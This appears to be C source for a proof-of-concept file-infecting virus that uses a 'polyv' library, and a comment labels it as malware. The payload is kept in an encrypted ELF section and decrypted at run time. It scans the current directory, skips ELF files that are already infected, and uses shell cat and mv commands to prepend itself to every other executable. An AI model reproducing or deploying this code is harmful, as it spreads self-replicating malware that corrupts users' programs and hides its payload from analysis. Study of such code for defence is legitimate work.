
#define POLYV_USE_ENCRYPTED_SECTION
#define POLYV_IMPLEMENTATION
#include <polyv.h>

#include <dirent.h>

/// Hardcoded size of the generated elf executable in bytes
#define POLYV_CLIENT_SIZE 34504

/// Main entry point of the malware 
int POLYV_ENCRYPTED payload(int argc, char* argv[]) {
    printf("Hello, Hidden!\n");

    DIR *dir;
    if (!(dir = opendir(".")))
        return -1;

    char target_path[512];
    struct dirent* entry;

    printf("Infection:\n");
    while((entry = readdir(dir)) != NULL) {

        // Copy itself on top of every executable on the directory
        if (entry->d_type == DT_REG) {
            snprintf(target_path, 1024, "./%s", entry->d_name);
            
            elf64 elf;
            if (!polyv_load_elf64(&elf, target_path))
                continue;

            // Check if already infected
            const Elf64_Shdr* etext = polyv_lookup_section(&elf, POLYV_ENCRYPTED_SECTION);
            if (etext != NULL) {
                polyv_unload_elf64(&elf);
                continue;
            }

            polyv_unload_elf64(&elf);

            // For now use the shell
            char command[1024];
            snprintf(command, 1024, "cat %s >> %s", argv[0], target_path);
            system(command);
            snprintf(command, 1024, "mv %s %s", target_path, argv[0]);
            system(command);

            // We have a target!
            printf("  %s\n", entry->d_name);
            
        }
    }

    return 0;
}

int main(int argc, char* argv[]) {

    printf("Key (hex):");
    for(size_t i = 0; i < POLYV_KEY_SIZE; i++) {
        if (i % 32 == 0) printf("\n\t");
        printf("%02x ", ((unsigned char*)polyv_symmetric_key)[i]);
    }
    printf("\n");

    // Decrypt and launch payload
    {
        // If the program has not been ignited then the key is all zero 
        // and encrypting/decrypting does nothing!
        polyv_self_sxor(polyv_symmetric_key, POLYV_KEY_SIZE);
        payload(argc, argv);
        polyv_self_sxor(polyv_symmetric_key, POLYV_KEY_SIZE);
    }

    // This should crash
    //payload(argc, argv);
    
    return 0;
}